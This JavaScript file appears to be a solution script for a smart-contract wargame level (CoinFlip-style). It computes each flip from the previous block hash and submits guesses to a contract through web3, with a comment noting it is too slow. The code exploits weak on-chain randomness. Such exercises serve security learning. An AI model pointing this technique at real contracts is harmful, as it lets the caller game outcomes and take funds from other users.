require("dotenv").config();
const attack = require("../scripts/attack") 
const { createAlchemyWeb3 } = require("@alch/alchemy-web3");
const web3 = createAlchemyWeb3(process.env.API_URL);

const abi = require("./abi.json");
const contractAddress = "0xa6A09E57C3f378478e8272635e4C1EB203A883Ea";
const contract = new web3.eth.Contract(abi, contractAddress);

// TEST
// blockhash remix
// 96295644508963302359223866841007920022480890644992946816264522587871600414627

// blockhash local
// 337465757620965379811359156200345811418376415449218153534126114148

// tests

// 10914677 => false (0xea55bf1cbe7b320f30113eb7c1fa66fbbc91bb7198d128ec67b8796cda17f016)
// 10914660 => true
// 10914650 => true

const block1 = 10914677
const block2 = 10914660
const block3 = 10914650
const block4 = 10914877

//

async function exploit() {
	try {
		var BN = web3.utils.BN;
		const factor = web3.utils.toBN("57896044618658097711785492504343953926634992332820282019728792003956564819968")
		console.log("FACTOR", factor.toString())
		
		let blockNumber = await web3.eth.getBlockNumber()

		blockNumber = blockNumber - 1
		console.log("BLOCK", blockNumber)

		let block = await web3.eth.getBlock(blockNumber)
		console.log("HASH", block.hash)
		
		let blockHashBN = web3.utils.toBN(block.hash);

		console.log("HASH BN", blockHashBN.toString())

		let flip = blockHashBN.div(factor) == 1 ? true : false;
		console.log("FLIP", flip)

		attack(
			contract,
			"write",
			"flip",
			"0",
			flip			
		);

	} catch (e) {
		console.log("error", e)
	}
		
}

//Too slow to send the transaction, wrong block number
exploit()